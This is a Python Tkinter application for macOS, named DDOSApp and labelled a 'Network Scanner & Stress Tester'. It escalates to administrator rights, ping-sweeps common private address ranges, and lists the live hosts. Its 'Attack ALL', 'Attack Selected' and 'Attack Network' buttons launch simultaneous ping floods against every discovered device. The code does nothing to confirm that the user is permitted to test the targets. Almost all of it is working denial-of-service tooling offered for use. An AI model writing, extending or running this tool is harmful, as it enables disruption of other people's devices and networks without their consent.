import os
import sys
import subprocess
import threading
import time
import socket
import re
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
from concurrent.futures import ThreadPoolExecutor

# --- ADMIN PRIVILEGE CHECKER ---
def run_as_admin():
    """Re-launch the app with admin privileges if needed"""
    if os.getuid() == 0:
        return
    
    if getattr(sys, 'frozen', False):
        app_path = sys.executable
    else:
        app_path = f"'{sys.executable}' '{os.path.abspath(sys.argv[0])}'"
    
    applescript = f'''
    do shell script "{app_path}" with administrator privileges
    '''
    
    try:
        subprocess.run(['osascript', '-e', applescript], check=True)
        sys.exit(0)
    except subprocess.CalledProcessError:
        messagebox.showerror(
            "Permission Required",
            "This application requires administrator privileges to run.\n\n"
            "Please enter your password when prompted."
        )
        sys.exit(1)

# --- Network Profiles ---
NETWORK_PROFILES = {
    "Smart Scan (Fast)": [
        # Directly connected + common gateways (fastest)
        '192.168.0', '192.168.1', '192.168.2', '192.168.10',
        '192.168.100', '10.0.0', '10.0.1',
    ],
    "Home/Consumer": [
        # All common home router ranges
        '192.168.0', '192.168.1', '192.168.2', '192.168.3',
        '192.168.4', '192.168.5', '192.168.8', '192.168.10',
        '192.168.11', '192.168.15', '192.168.25', '192.168.31',
        '192.168.42', '192.168.43', '192.168.49', '192.168.50',
        '192.168.55', '192.168.88', '192.168.100', '192.168.101',
        '192.168.102', '192.168.123', '192.168.168', '192.168.178',
        '192.168.200', '192.168.222', '192.168.254',
        '10.0.0', '10.0.1', '10.0.10',
        '172.20.10',  # iOS hotspot
    ],
    "Business/Enterprise": [
        # Business/office/enterprise ranges
        '192.168.0', '192.168.1', '192.168.10', '192.168.20',
        '192.168.30', '192.168.40', '192.168.50', '192.168.100',
        '10.0.0', '10.0.1', '10.0.10', '10.1.1', '10.1.10',
        '10.10.0', '10.10.1', '10.10.10', '10.11.12',
        '10.100.0', '10.200.0', '10.254.0',
        '172.16.0', '172.16.1', '172.16.10', '172.16.25',
        '172.16.30', '172.16.42', '172.16.100',
        '172.31.0',  # AWS VPC
    ],
    "Full Scan (Slow)": [
        # Everything - comprehensive scan (slowest)
        '192.168.0', '192.168.1', '192.168.2', '192.168.3',
        '192.168.4', '192.168.5', '192.168.6', '192.168.7',
        '192.168.8', '192.168.9', '192.168.10', '192.168.11',
        '192.168.12', '192.168.13', '192.168.15', '192.168.16',
        '192.168.18', '192.168.20', '192.168.22', '192.168.25',
        '192.168.27', '192.168.30', '192.168.31', '192.168.32',
        '192.168.40', '192.168.42', '192.168.43', '192.168.44',
        '192.168.49', '192.168.50', '192.168.55', '192.168.66',
        '192.168.77', '192.168.88', '192.168.99', '192.168.100',
        '192.168.101', '192.168.102', '192.168.123', '192.168.168',
        '192.168.178', '192.168.200', '192.168.222', '192.168.225',
        '192.168.254',
        '10.0.0', '10.0.1', '10.0.10', '10.1.1', '10.1.10',
        '10.10.0', '10.10.1', '10.10.10', '10.11.12', '10.100.0',
        '10.200.0', '10.254.0',
        '172.16.0', '172.16.1', '172.16.10', '172.16.25',
        '172.16.30', '172.16.42', '172.16.100',
        '172.20.10', '172.20.11', '172.31.0', '172.31.1',
    ]
}

# --- GUI CLASS ---
class DDOSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Scanner & Stress Tester")
        self.root.geometry("850x650")
        self.root.configure(bg='#2b2b2b')
        
        # Configuration
        self.CHECKS_PER_DEVICE = 3
        self.MAX_THREADS = 50
        
        # Store attack processes and threads
        self.attack_processes = []
        self.attack_threads = []
        self.stop_flag = False
        self.scanning = False
        self.attacking = False
        
        # Store discovered networks and devices
        self.discovered_networks = {}
        self.all_devices = []
        
        # Style configuration
        style = ttk.Style()
        style.theme_use('clam')
        
        # Button styles
        style.configure('Scan.TButton', 
                       background='#4CAF50', 
                       foreground='white', 
                       font=('Arial', 10, 'bold'),
                       padding=8)
        style.map('Scan.TButton',
                 background=[('active', '#45a049'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        style.configure('Quick.TButton', 
                       background='#2196F3', 
                       foreground='white', 
                       font=('Arial', 9, 'bold'),
                       padding=6)
        style.map('Quick.TButton',
                 background=[('active', '#1976D2'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        style.configure('Attack.TButton', 
                       background='#ff6600', 
                       foreground='white', 
                       font=('Arial', 10, 'bold'),
                       padding=8)
        style.map('Attack.TButton',
                 background=[('active', '#cc5500'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        style.configure('Stop.TButton', 
                       background='#f44336', 
                       foreground='white', 
                       font=('Arial', 10, 'bold'),
                       padding=8)
        style.map('Stop.TButton',
                 background=[('active', '#da190b'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        # Main container
        main_container = tk.Frame(root, bg='#2b2b2b')
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tk.Label(main_container, 
                              text="Network Scanner & Stress Tester", 
                              font=("Arial", 16, "bold"),
                              fg='white', 
                              bg='#2b2b2b')
        title_label.pack(pady=5)
        
        # Scan Profile Frame
        profile_frame = tk.Frame(main_container, bg='#2b2b2b')
        profile_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(profile_frame, 
                text="Scan Profile:", 
                font=("Arial", 10),
                fg='#aaaaaa', 
                bg='#2b2b2b').pack(side=tk.LEFT, padx=5)
        
        self.scan_profile_var = tk.StringVar(value="Smart Scan (Fast)")
        profile_menu = ttk.OptionMenu(profile_frame, self.scan_profile_var, 
                                      "Smart Scan (Fast)",
                                      "Smart Scan (Fast)", 
                                      "Home/Consumer", 
                                      "Business/Enterprise",
                                      "Full Scan (Slow)")
        profile_menu.pack(side=tk.LEFT, padx=5)
        
        # Quick scan buttons
        self.smart_scan_btn = ttk.Button(
            profile_frame, 
            text="🔍 Smart Scan", 
            style='Quick.TButton',
            command=lambda: self.discover_networks("smart")
        )
        self.smart_scan_btn.pack(side=tk.LEFT, padx=3)
        
        self.home_scan_btn = ttk.Button(
            profile_frame, 
            text="🏠 Home", 
            style='Quick.TButton',
            command=lambda: self.discover_networks("home")
        )
        self.home_scan_btn.pack(side=tk.LEFT, padx=3)
        
        self.business_scan_btn = ttk.Button(
            profile_frame, 
            text="🏢 Business", 
            style='Quick.TButton',
            command=lambda: self.discover_networks("business")
        )
        self.business_scan_btn.pack(side=tk.LEFT, padx=3)
        
        self.full_scan_btn = ttk.Button(
            profile_frame, 
            text="🌍 Full Scan", 
            style='Quick.TButton',
            command=lambda: self.discover_networks("full")
        )
        self.full_scan_btn.pack(side=tk.LEFT, padx=3)
        
        # Create PanedWindow for split view
        paned = tk.PanedWindow(main_container, orient=tk.HORIZONTAL, bg='#2b2b2b', sashwidth=5)
        paned.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Left panel - Network Tree
        left_frame = tk.Frame(paned, bg='#2b2b2b')
        paned.add(left_frame, width=250)
        
        tk.Label(left_frame, 
                text="Discovered Networks", 
                font=("Arial", 11, "bold"),
                fg='white', 
                bg='#2b2b2b').pack(pady=5)
        
        self.tree = ttk.Treeview(left_frame, height=20)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        tree_scroll = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=tree_scroll.set)
        
        # Right panel - Log
        right_frame = tk.Frame(paned, bg='#2b2b2b')
        paned.add(right_frame, width=550)
        
        tk.Label(right_frame, 
                text="Log", 
                font=("Arial", 11, "bold"),
                fg='white', 
                bg='#2b2b2b').pack(pady=5)
        
        self.log_box = scrolledtext.ScrolledText(
            right_frame, 
            width=60, 
            height=20, 
            bg='#1e1e1e', 
            fg='#00ff00',
            insertbackground='white',
            font=('Courier', 10),
            state='disabled'
        )
        self.log_box.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure tags for colored text
        self.log_box.tag_config('info', foreground='#00ff00')
        self.log_box.tag_config('warning', foreground='#ffaa00')
        self.log_box.tag_config('error', foreground='#ff4444')
        self.log_box.tag_config('success', foreground='#44ff44')
        self.log_box.tag_config('attack', foreground='#ff4444')
        self.log_box.tag_config('scanning', foreground='#888888')
        self.log_box.tag_config('discovery', foreground='#00ccff')
        self.log_box.tag_config('profile', foreground='#ffaa00')
        
        # Button Frame
        btn_frame = tk.Frame(main_container, bg='#2b2b2b')
        btn_frame.pack(pady=10, fill=tk.X)
        
        left_buttons = tk.Frame(btn_frame, bg='#2b2b2b')
        left_buttons.pack(side=tk.LEFT, padx=5)
        
        attack_frame = tk.Frame(btn_frame, bg='#2b2b2b')
        attack_frame.pack(side=tk.LEFT, padx=20)
        
        self.attack_all_btn = ttk.Button(
            attack_frame, 
            text="⚡ Attack ALL", 
            style='Attack.TButton',
            command=lambda: self.start_attack("all"),
            state='disabled'
        )
        self.attack_all_btn.pack(side=tk.LEFT, padx=5)
        
        self.attack_selected_btn = ttk.Button(
            attack_frame, 
            text="🎯 Attack Selected", 
            style='Attack.TButton',
            command=lambda: self.start_attack("selected"),
            state='disabled'
        )
        self.attack_selected_btn.pack(side=tk.LEFT, padx=5)
        
        self.attack_network_btn = ttk.Button(
            attack_frame, 
            text="🌐 Attack Network", 
            style='Attack.TButton',
            command=lambda: self.start_attack("network"),
            state='disabled'
        )
        self.attack_network_btn.pack(side=tk.LEFT, padx=5)
        
        right_buttons = tk.Frame(btn_frame, bg='#2b2b2b')
        right_buttons.pack(side=tk.RIGHT, padx=5)
        
        self.stop_btn = ttk.Button(
            right_buttons, 
            text="⏹ Stop All Attacks", 
            style='Stop.TButton',
            command=self.stop_all
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            main_container, 
            variable=self.progress_var, 
            length=600
        )
        self.progress_bar.pack(pady=5)
        
        # Status bar
        self.status_label = tk.Label(
            main_container, 
            text="Ready - Select scan profile and click a scan button", 
            font=("Arial", 9),
            fg='#aaaaaa', 
            bg='#2b2b2b',
            anchor=tk.W
        )
        self.status_label.pack(fill=tk.X, pady=5)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        self.log("=" * 60, 'info')
        self.log("Network Scanner & Stress Tester Started", 'info')
        self.log("=" * 60, 'info')
        self.log(f"UID: {os.getuid()} {'(Root)' if os.getuid() == 0 else '(User)'}", 'info')
        self.log("Scan Profiles:", 'info')
        self.log("  🔍 Smart Scan - Direct interfaces + 7 common gateways (fastest)", 'info')
        self.log("  🏠 Home - 30+ home/consumer router ranges", 'info')
        self.log("  🏢 Business - 25+ business/enterprise ranges", 'info')
        self.log("  🌍 Full Scan - 70+ network ranges (slowest)", 'info')
        self.log("Ready to scan!\n", 'info')

    def log(self, message, tag='info'):
        self.root.after(0, self._update_log, message, tag)

    def _update_log(self, message, tag):
        self.log_box.config(state='normal')
        self.log_box.insert(tk.END, message + "\n", tag)
        self.log_box.see(tk.END)
        self.log_box.config(state='disabled')
        
    def update_status(self, message):
        self.root.after(0, self._update_status, message)
        
    def _update_status(self, message):
        self.status_label.config(text=message)
        
    def update_progress(self, value, maximum=100):
        self.root.after(0, self._update_progress, value, maximum)
        
    def _update_progress(self, value, maximum):
        self.progress_var.set(value)
        self.progress_bar.config(maximum=maximum)

    def disable_buttons(self):
        """Disable all scan/attack buttons during operation"""
        self.smart_scan_btn.config(state='disabled')
        self.home_scan_btn.config(state='disabled')
        self.business_scan_btn.config(state='disabled')
        self.full_scan_btn.config(state='disabled')
        self.attack_all_btn.config(state='disabled')
        self.attack_selected_btn.config(state='disabled')
        self.attack_network_btn.config(state='disabled')
        
    def enable_scan_buttons(self):
        """Re-enable scan buttons"""
        self.smart_scan_btn.config(state='normal')
        self.home_scan_btn.config(state='normal')
        self.business_scan_btn.config(state='normal')
        self.full_scan_btn.config(state='normal')
        
    def enable_attack_buttons(self):
        """Enable attack buttons if devices found"""
        if self.all_devices:
            self.attack_all_btn.config(state='normal')
            self.attack_selected_btn.config(state='normal')
            self.attack_network_btn.config(state='normal')

    def get_local_networks(self, profile="smart"):
        """
        Discover all accessible networks.
        profile: "smart", "home", "business", "full"
        """
        networks = []
        found_networks = set()
        
        # Map profile to network list
        profile_name = {
            "smart": "Smart Scan (Fast)",
            "home": "Home/Consumer",
            "business": "Business/Enterprise",
            "full": "Full Scan (Slow)"
        }.get(profile, "Smart Scan (Fast)")
        
        self.log(f"\n📋 Using profile: {profile_name}", 'profile')
        
        # Method 1: Always try ipconfig for directly connected interfaces
        self.log("  Checking directly connected interfaces...", 'scanning')
        for interface in ['en0', 'en1', 'en2', 'en3', 'en4', 'en5']:
            try:
                ip_result = subprocess.run(['ipconfig', 'getifaddr', interface],
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                         timeout=2)
                if ip_result.returncode == 0 and ip_result.stdout.strip():
                    ip = ip_result.stdout.strip()
                    
                    mask_result = subprocess.run(['ipconfig', 'getoption', interface, 'subnet_mask'],
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                               timeout=2)
                    
                    if mask_result.returncode == 0 and mask_result.stdout.strip():
                        netmask = mask_result.stdout.strip()
                        
                        ip_parts = [int(x) for x in ip.split('.')]
                        mask_parts = [int(x) for x in netmask.split('.')]
                        
                        if len(ip_parts) == 4 and len(mask_parts) == 4:
                            network_parts = [str(ip_parts[i] & mask_parts[i]) for i in range(4)]
                            network = '.'.join(network_parts[:3])
                            
                            if network not in found_networks and not network.startswith('127.'):
                                found_networks.add(network)
                                networks.append({
                                    'network': network,
                                    'interface': interface,
                                    'ip': ip,
                                    'netmask': netmask
                                })
                                self.log(f"  ✓ {network}.0/24 on {interface} ({ip})", 'discovery')
            except:
                pass
        
        # Method 2: Ping gateways based on profile
        if not networks:
            self.log("  No direct interfaces, scanning gateways...", 'scanning')
        else:
            self.log(f"  Scanning {len(NETWORK_PROFILES[profile_name])} gateway(s) for additional networks...", 'scanning')
            
        gateways_to_check = NETWORK_PROFILES[profile_name]
        gateways_found = 0
        
        for network in gateways_to_check:
            if self.stop_flag:
                break
                
            if network in found_networks:
                continue  # Already found via direct interface
                
            gateway = f"{network}.1"
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', gateway], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                if result.returncode == 0:
                    gateways_found += 1
                    found_networks.add(network)
                    networks.append({
                        'network': network,
                        'interface': 'gateway',
                        'ip': 'gateway',
                        'netmask': '255.255.255.0'
                    })
                    self.log(f"  ✓ {network}.0/24 (gateway responds)", 'discovery')
            except:
                pass
        
        if gateways_found == 0 and not networks:
            self.log("  No additional networks found via gateway ping", 'warning')
            
        return networks

    def is_device_alive(self, ip):
        if self.stop_flag:
            return False
            
        for attempt in range(self.CHECKS_PER_DEVICE):
            if self.stop_flag:
                return False
                
            cmd = ['ping', '-c', '1', '-W', '1', ip]
            
            try:
                result = subprocess.run(
                    cmd, 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )
                
                if result.returncode == 0:
                    return True
                    
            except Exception:
                pass
                
        return False

    def discover_networks(self, profile="smart"):
        if self.scanning:
            self.log("⚠ Discovery already in progress", 'warning')
            return
            
        self.scanning = True
        self.stop_flag = False
        self.disable_buttons()
        
        self.discovered_networks = {}
        self.all_devices = []
        self.tree.delete(*self.tree.get_children())
        
        profile_name = {
            "smart": "Smart Scan (Fast)",
            "home": "Home/Consumer",
            "business": "Business/Enterprise",
            "full": "Full Scan (Slow)"
        }.get(profile, "Smart Scan (Fast)")
        
        self.log("\n" + "=" * 60, 'discovery')
        self.log(f"🔍 PHASE 1: Network Discovery [{profile_name}]", 'discovery')
        self.log("=" * 60, 'discovery')
        self.log("\n📡 Finding local networks...", 'discovery')
        
        networks = self.get_local_networks(profile)
        
        if not networks:
            self.log("⚠ No networks found! Try a different profile or check connection.", 'warning')
            self.scanning = False
            self.enable_scan_buttons()
            self.update_status("No networks found. Try a different scan profile.")
            return
            
        self.log(f"\n✓ Found {len(networks)} network(s)", 'success')
        for net in networks:
            network_id = self.tree.insert('', 'end', 
                                         text=f"📶 {net['network']}.0/24 ({net['interface']})", 
                                         values=('network', net['network']))
            self.discovered_networks[net['network']] = {
                'tree_id': network_id,
                'devices': []
            }
        
        all_ips = []
        for net in networks:
            network = net['network']
            for i in range(1, 255):
                all_ips.append(f"{network}.{i}")
        
        total_ips = len(all_ips)
        self.log(f"\n🔍 Scanning {total_ips} IPs across {len(networks)} network(s)...", 'discovery')
        self.log(f"   This may take a while for larger profiles...\n", 'scanning')
        self.update_progress(0, total_ips)
        
        def scan_worker():
            scanned = 0
            devices_found = 0
            
            with ThreadPoolExecutor(max_workers=self.MAX_THREADS) as executor:
                futures = {executor.submit(self.is_device_alive, ip): ip for ip in all_ips}
                
                for future in futures:
                    if self.stop_flag:
                        break
                        
                    ip = futures[future]
                    scanned += 1
                    self.update_progress(scanned, total_ips)
                    
                    # Update status every 10 IPs to reduce UI lag
                    if scanned % 10 == 0:
                        self.update_status(f"Scanning... {scanned}/{total_ips} ({int(scanned/total_ips*100)}%)")
                    
                    try:
                        if future.result():
                            network = '.'.join(ip.split('.')[:3])
                            
                            if network in self.discovered_networks:
                                devices_found += 1
                                self.all_devices.append(ip)
                                self.discovered_networks[network]['devices'].append(ip)
                                
                                self.tree.insert(
                                    self.discovered_networks[network]['tree_id'],
                                    'end',
                                    text=f"💻 {ip}",
                                    values=('device', ip)
                                )
                                
                                self.log(f"[+] Found: {ip}", 'success')
                    except:
                        pass
            
            if not self.stop_flag:
                self.log(f"\n✓ Discovery complete! Found {devices_found} devices.", 'success')
                
                if devices_found > 0:
                    self.root.after(0, self.enable_attack_buttons)
                    self.update_status(f"Found {devices_found} devices across {len(networks)} networks. Select targets and attack.")
                else:
                    self.update_status("No devices found. Try a different profile or check network.")
            else:
                self.log("\n⚠ Discovery interrupted", 'warning')
            
            self.scanning = False
            self.root.after(0, self.enable_scan_buttons)
            self.update_progress(0, 100)
            
        threading.Thread(target=scan_worker, daemon=True).start()

    def start_attack(self, mode):
        if self.attacking:
            self.log("⚠ Attacks already in progress", 'warning')
            return
            
        targets = []
        
        if mode == "all":
            targets = self.all_devices
            if not targets:
                self.log("⚠ No devices to attack!", 'warning')
                return
            self.log(f"\n⚡ Attacking ALL {len(targets)} devices...", 'attack')
            
        elif mode == "selected":
            selected_items = self.tree.selection()
            for item in selected_items:
                values = self.tree.item(item)['values']
                if values and values[0] == 'device':
                    targets.append(values[1])
                    
            if not targets:
                self.log("⚠ No devices selected! Select devices in the tree first.", 'warning')
                self.log("  Tip: Hold Ctrl/Cmd to select multiple devices", 'info')
                return
            self.log(f"\n🎯 Attacking {len(targets)} selected devices...", 'attack')
            
        elif mode == "network":
            selected_items = self.tree.selection()
            if not selected_items:
                self.log("⚠ No network selected! Select a network in the tree first.", 'warning')
                return
                
            for item in selected_items:
                values = self.tree.item(item)['values']
                if values and values[0] == 'network':
                    network = values[1]
                    if network in self.discovered_networks:
                        targets.extend(self.discovered_networks[network]['devices'])
            
            if not targets:
                self.log("⚠ No network selected! Select a network (not a device) in the tree.", 'warning')
                return
            self.log(f"\n🌐 Attacking network with {len(targets)} devices...", 'attack')
        
        if not targets:
            self.log("⚠ No targets to attack!", 'warning')
            return
            
        targets = list(set(targets))
        
        self.attacking = True
        self.stop_flag = False
        
        self.log("=" * 40, 'attack')
        
        for ip in targets:
            t = threading.Thread(target=self.start_flood, args=(ip,), daemon=True)
            t.start()
            time.sleep(0.1)
            
        self.log(f"⚡ All attacks launched on {len(targets)} targets", 'attack')
        self.log("=" * 40 + "\n", 'attack')
        self.update_status(f"Attacking {len(targets)} devices - Click Stop to end")
        
        self.disable_buttons()
        self.stop_btn.config(state='normal')

    def start_flood(self, ip):
        if self.stop_flag:
            return
            
        self.log(f"🚀 Starting attack on {ip}...", 'attack')
        
        if os.getuid() != 0:
            cmd = ['ping', '-i', '0.1', ip]
        else:
            cmd = ['ping', '-f', ip]
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.attack_processes.append(process)
            
            current_thread = threading.current_thread()
            self.attack_threads.append(current_thread)
            
            while not self.stop_flag:
                if process.poll() is not None:
                    break
                time.sleep(0.5)
                
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=3)
                except:
                    process.kill()
                    
            if process in self.attack_processes:
                self.attack_processes.remove(process)
                
        except Exception as e:
            self.log(f"✗ Error attacking {ip}: {e}", 'error')
        finally:
            if process in self.attack_processes:
                self.attack_processes.remove(process)
            if current_thread in self.attack_threads:
                self.attack_threads.remove(current_thread)

    def stop_all(self):
        if not self.attack_processes and not self.scanning:
            return
            
        self.log("\n" + "=" * 40, 'error')
        self.log("🛑 Stopping floods...", 'error')
        self.stop_flag = True
        self.scanning = False
        self.attacking = False
        self.update_status("Stopping attacks...")
        
        for thread in self.attack_threads[:]:
            thread.join(timeout=2)
        
        for process in self.attack_processes[:]:
            try:
                process.terminate()
                process.wait(timeout=2)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        self.attack_processes.clear()
        self.attack_threads.clear()
        self.log("✓ All attacks stopped", 'success')
        self.log("=" * 40 + "\n", 'info')
        self.update_status("Ready")
        
        self.enable_scan_buttons()
        self.enable_attack_buttons()

    def on_closing(self):
        if self.attack_processes:
            if messagebox.askokcancel("Quit", "Attacks are still running. Stop them and quit?"):
                self.stop_all()
                self.root.destroy()
        else:
            self.root.destroy()

if __name__ == "__main__":
    run_as_admin()
    root = tk.Tk()
    app = DDOSApp(root)
    root.mainloop()